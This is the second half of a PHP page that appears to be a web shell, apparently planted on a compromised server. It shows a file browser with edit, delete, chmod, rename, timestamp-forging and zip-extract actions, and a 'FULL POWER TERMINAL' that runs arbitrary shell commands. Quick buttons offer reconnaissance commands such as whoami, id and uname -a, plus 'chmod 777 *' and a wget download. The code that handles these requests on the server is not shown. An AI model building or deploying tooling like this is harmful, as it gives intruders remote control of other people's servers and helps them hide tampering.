                            // Tampilkan folder dulu
                            foreach ($folders as $item) {
                                $path = $__dir__ . '/' . $item;
                                $is_dir = true;
                                $size = '-';
                                $perm = substr(sprintf('%o', fileperms($path)), -4);
                                $modified = date('Y-m-d H:i', filemtime($path));
                                $row_id = 'row_' . md5($item);
                                
                                $perm_status = getPermissionStatus($path, $perm, true);
                                $perm_class = 'perm-' . $perm_status;
                                ?>
                                <tr id="<?php echo $row_id; ?>" class="cursor-pointer">
                                    <td class="cursor-column">
                                        <input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" id="cb_<?php echo md5($item); ?>">
                                    </td>
                                    <td class="folder">
                                        <a href="?__d__=<?php echo urlencode($path); ?>" class="folder-link" style="color: var(--orange); text-decoration: none;">
                                            📁 <?php echo htmlspecialchars($item); ?>
                                        </a>
                                    </td>
                                    <td><?php echo $size; ?></td>
                                    <td class="<?php echo $perm_class; ?>">
                                        <?php echo $perm; ?>
                                    </td>
                                    <td><?php echo $modified; ?></td>
                                    <td>
                                        <a href="?__d__=<?php echo urlencode($path); ?>" class="action-btn">📂 OPEN</a>
                                        <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-chmod">🔧 CHMOD</a>
                                        <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-rename">✏️ RENAME</a>
                                        <a href="javascript:void(0)" onclick="showTimeModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-time">🕒 TIME</a>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" class="action-btn btn-danger">🗑 DELETE</a>
                                    </td>
                                </tr>
                                <?php
                            }
                            
                            // Tambahkan pembatas jika ada folder dan file
                            if (!empty($folders) && !empty($files)): ?>
                            <tr>
                                <td colspan="6" style="padding: 5px 0;">
                                    <hr style="border: none; border-top: 1px solid rgba(139,0,0,0.3); margin: 0;">
                                </td>
                            </tr>
                            <?php endif;
                            
                            // Tampilkan file
                            foreach ($files as $item) {
                                $path = $__dir__ . '/' . $item;
                                $is_dir = false;
                                $size = round(filesize($path)/1024, 2) . ' KB';
                                $perm = substr(sprintf('%o', fileperms($path)), -4);
                                $modified = date('Y-m-d H:i', filemtime($path));
                                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                                $row_id = 'row_' . md5($item);
                                
                                $perm_status = getPermissionStatus($path, $perm, false);
                                $perm_class = 'perm-' . $perm_status;
                                ?>
                                <tr id="<?php echo $row_id; ?>" class="cursor-pointer">
                                    <td class="cursor-column">
                                        <input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" id="cb_<?php echo md5($item); ?>">
                                    </td>
                                    <td class="file">
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="file-link" style="color: var(--ghost); text-decoration: none;">
                                            📄 <?php echo htmlspecialchars($item); ?>
                                        </a>
                                    </td>
                                    <td><?php echo $size; ?></td>
                                    <td class="<?php echo $perm_class; ?>">
                                        <?php echo $perm; ?>
                                    </td>
                                    <td><?php echo $modified; ?></td>
                                    <td>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="action-btn action-btn-edit">✏️ EDIT</a>
                                        <?php if ($ext == 'zip'): ?>
                                            <a href="?__d__=<?php echo urlencode($__dir__); ?>&__extract__=<?php echo urlencode($item); ?>" onclick="return confirm('Extract <?php echo htmlspecialchars($item); ?>?')" class="action-btn action-btn-edit">📦 EXTRACT</a>
                                        <?php endif; ?>
                                        <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-chmod">🔧 CHMOD</a>
                                        <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-rename">✏️ RENAME</a>
                                        <a href="javascript:void(0)" onclick="showTimeModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-time">🕒 TIME</a>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" class="action-btn btn-danger">🗑 DELETE</a>
                                    </td>
                                </tr>
                                <?php
                            }
                        }
                        ?>
                    </tbody>
                </table>
                
                <div class="batch-actions">
                    <button type="submit" name="__delete_selected__" class="btn btn-danger" onclick="return confirm('Delete selected items?')">🗑 DELETE SELECTED</button>
                </div>
            </form>
        </div>
        
        <?php if ($editing_file): ?>
        <div class="edit-box">
            <h3>
                ✏️ EDITING: <?php echo htmlspecialchars($editing_file); ?>
            </h3>
            <?php
            $target = $__dir__ . '/' . $editing_file;
            $can_edit = __is_writable($target);
            ?>
            <form method="post" id="editForm">
                <textarea name="__content__" class="editor" spellcheck="false" id="fileEditor" <?php echo !$can_edit ? 'readonly' : ''; ?>><?php echo htmlspecialchars($file_content); ?></textarea>
                <input type="hidden" name="__edit_file__" value="<?php echo htmlspecialchars($editing_file); ?>">
                <div class="editor-controls">
                    <div class="editor-info">
                        File size: <?php echo round(strlen($file_content)/1024, 2); ?> KB | 
                        Lines: <?php echo substr_count($file_content, "\n") + 1; ?> | 
                        Modified: <?php echo date('Y-m-d H:i', filemtime($__dir__ . '/' . $editing_file)); ?> |
                        Status: <?php echo $can_edit ? '<span style="color:#00ff00;">Writable</span>' : '<span style="color:#ffffff;">Read-only</span>'; ?>
                    </div>
                    <div>
                        <?php if ($can_edit): ?>
                            <button type="submit" class="btn btn-success">💾 SAVE</button>
                        <?php else: ?>
                            <button type="button" class="btn btn-success" disabled title="File is read-only">💾 SAVE</button>
                        <?php endif; ?>
                        <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="btn btn-danger">❌ CANCEL</a>
                    </div>
                </div>
            </form>
        </div>
        <?php endif; ?>
        
        <div class="terminal">
            <h3>💻 <span class="power-indicator">FULL POWER</span> TERMINAL</h3>
            <div class="terminal-path">
                📍 Current path: <span><?php echo htmlspecialchars($__dir__); ?></span>
            </div>
            <form method="post" id="terminalForm">
                <input type="text" name="__cmd__" class="form-control" id="cmdInput" 
                       placeholder="Enter command (executed from current directory)" autocomplete="off">
                <button type="submit" class="btn">⚡ GASSKAN</button>
            </form>
            <div class="cmd-examples">
                <strong>Quick commands (click to use):</strong><br>
                <code onclick="setCommand('pwd')">pwd</code>
                <code onclick="setCommand('whoami')">whoami</code>
                <code onclick="setCommand('id')">id</code>
                <code onclick="setCommand('uname -a')">uname -a</code>
                <code onclick="setCommand('ls -la')">ls -la</code>
                <code onclick="setCommand('ls -lah')">ls -lah</code>
                <code onclick="setCommand('chmod 777 *')">chmod 777 all</code>
                <code onclick="setCommand('find . -type f -name \"*.php\" 2>/dev/null | head -20')">find php (here)</code>
                <code onclick="setCommand('wget https://example.com/file.zip')">wget file</code>
            </div>
            <?php if ($cmd_output): ?>
                <div class="terminal-output"><?php echo nl2br(htmlspecialchars($cmd_output)); ?></div>
            <?php endif; ?>
        </div>
        
        <div class="footer">
            ⚡ <span class="power-indicator">FULL ACCESS - TERMINAL EXECUTES FROM CURRENT PATH</span> ⚡<br>
            <?php echo date('Y-m-d H:i:s'); ?>
        </div>
    </div>
    
    <script>
        // Simple functions tanpa shortcut keyboard
        let selectedRow = null;
        
        function handleCheckboxClick(event, rowId) {
            event.stopPropagation();
            const checkbox = document.getElementById('cb_' + rowId.replace('row_', ''));
            if (!checkbox) return;
            checkbox.checked = !checkbox.checked;
            
            const row = document.getElementById(rowId);
            if (checkbox.checked) {
                row.classList.add('selected');
                selectedRow = row;
            } else {
                row.classList.remove('selected');
                selectedRow = null;
            }
        }
        
        function highlightRow(rowId) {
            const row = document.getElementById(rowId);
            if (row && row !== selectedRow) {
                row.style.backgroundColor = 'rgba(255,0,0,0.05)';
            }
        }
        
        function unhighlightRow(rowId) {
            const row = document.getElementById(rowId);
            if (row && row !== selectedRow) {
                row.style.backgroundColor = '';
            }
        }
        
        document.getElementById('selectAll').addEventListener('change', function(e) {
            const checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            checkboxes.forEach(cb => {
                cb.checked = e.target.checked;
                const row = cb.closest('tr');
                if (e.target.checked) {
                    row.classList.add('selected');
                } else {
                    row.classList.remove('selected');
                }
            });
        });
        
        function setCommand(cmd) {
            document.getElementById('cmdInput').value = cmd;
            document.getElementById('cmdInput').focus();
        }
        
        function showChmodModal(filename) {
            document.getElementById('chmodFile').value = filename;
            document.getElementById('chmodRecursiveFile').value = filename;
            document.getElementById('chmodModal').style.display = 'block';
            setTimeout(() => {
                document.querySelector('#chmodForm input[name="__permissions__"]').focus();
            }, 100);
        }
        
        function showRenameModal(filename) {
            document.getElementById('renameOld').value = filename;
            document.getElementById('renameModal').style.display = 'block';
            setTimeout(() => {
                const newNameInput = document.querySelector('#renameForm input[name="__rename_new__"]');
                newNameInput.value = filename;
                newNameInput.focus();
                newNameInput.select();
            }, 100);
        }
        
        function showTimeModal(filename) {
            document.getElementById('touchFile').value = filename;
            document.getElementById('timeModal').style.display = 'block';
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        
        function setTimestamp(type) {
            const now = new Date();
            let date = new Date();
            
            if (type === 'yesterday') {
                date.setDate(now.getDate() - 1);
            } else {
                date = now;
            }
            
            const formatted = date.toISOString().slice(0, 16);
            document.querySelector('#timeForm input[name="__timestamp__"]').value = formatted;
        }
        
        window.onclick = function(event) {
            if (event.target.className === 'modal') {
                event.target.style.display = 'none';
            }
        }
        
        <?php if ($editing_file): ?>
        document.getElementById('fileEditor').focus();
        <?php else: ?>
        document.getElementById('cmdInput').focus();
        <?php endif; ?>
        
        document.querySelectorAll('.folder-link, .file-link').forEach(link => {
            link.addEventListener('click', function(e) {
                e.stopPropagation();
            });
        });
        
        const editor = document.getElementById('fileEditor');
        if (editor) {
            editor.addEventListener('input', function() {
                const lines = this.value.split('\n').length;
                const size = (new Blob([this.value]).size / 1024).toFixed(2);
                document.querySelector('.editor-info').innerHTML = 
                    `File size: ${size} KB | Lines: ${lines} | Modified: Now`;
            });
            
            function autoResizeEditor() {
                const lines = editor.value.split('\n').length;
                const minHeight = 300;
                const maxHeight = 800;
                const lineHeight = 20;
                const newHeight = Math.min(maxHeight, Math.max(minHeight, lines * lineHeight + 50));
                editor.style.height = newHeight + 'px';
            }
            
            editor.addEventListener('input', autoResizeEditor);
            autoResizeEditor();
        }
        
        // Terminal history dan autocomplete sederhana
        const terminalHistory = [];
        let historyIndex = -1;
        
        document.getElementById('terminalForm').addEventListener('submit', function() {
            const cmdInput = document.getElementById('cmdInput');
            if (cmdInput.value.trim()) {
                terminalHistory.push(cmdInput.value);
                historyIndex = terminalHistory.length;
            }
        });
        
        document.getElementById('cmdInput').addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (terminalHistory.length > 0) {
                    if (historyIndex > 0) {
                        historyIndex--;
                    }
                    this.value = terminalHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (terminalHistory.length > 0) {
                    if (historyIndex < terminalHistory.length - 1) {
                        historyIndex++;
                        this.value = terminalHistory[historyIndex] || '';
                    } else {
                        historyIndex = terminalHistory.length;
                        this.value = '';
                    }
                }
            }
        });
    </script>
</body>
</html>
